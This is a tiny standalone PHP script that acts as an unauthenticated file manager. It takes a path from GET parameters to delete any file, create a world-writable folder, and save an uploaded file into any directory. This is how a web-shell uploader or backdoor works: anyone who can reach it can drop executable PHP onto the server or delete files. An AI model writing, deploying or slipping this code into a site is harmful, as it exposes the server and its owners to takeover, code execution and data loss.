<?php
$del = $_GET["dellog"];
$folder = $_GET["folder"];
mkdir($folder,0777);
$file = $_GET["path"];
if (!empty($_FILES["file"])){
move_uploaded_file($_FILES["file"]["tmp_name"],
      $file . "/" . $_FILES["file"]["name"]);
}
unlink($del);
?>